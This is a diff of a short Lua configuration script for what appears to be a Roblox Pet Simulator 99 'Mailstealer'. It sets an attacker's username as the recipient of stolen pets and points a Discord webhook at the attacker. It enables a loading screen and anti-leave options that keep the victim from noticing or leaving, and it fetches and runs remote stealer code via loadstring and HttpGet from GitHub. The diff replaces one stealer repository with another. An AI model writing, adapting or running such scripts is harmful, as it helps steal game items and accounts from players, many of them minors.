@@ -1,22 +1,4 @@
---[[
-  __  __       _ _     _             _           
-  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
-  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
-  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
-  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+Username = LX_petsimxgift12
+LoadScreen = true Webhook = https://discord.gg/kB3Mhzsy -- Paste your Discord webhook here 
 
-
-]]--
-
-
-UserName = LX_petsimxgift12 -- good pets
-Webhook = "Webhook Here" -- pings for pets
-UserName2 = LX_petsimxgift12 -- bad pets
-
-
-_G.LoadingScreen = true -- make it true if you want the loadingscreen
-_G.AntiLeave = true -- make it true if you want the antileave
-_G.MouseLock = true -- make it true if you want the mouselock
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/Mailstealer/main/engine"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
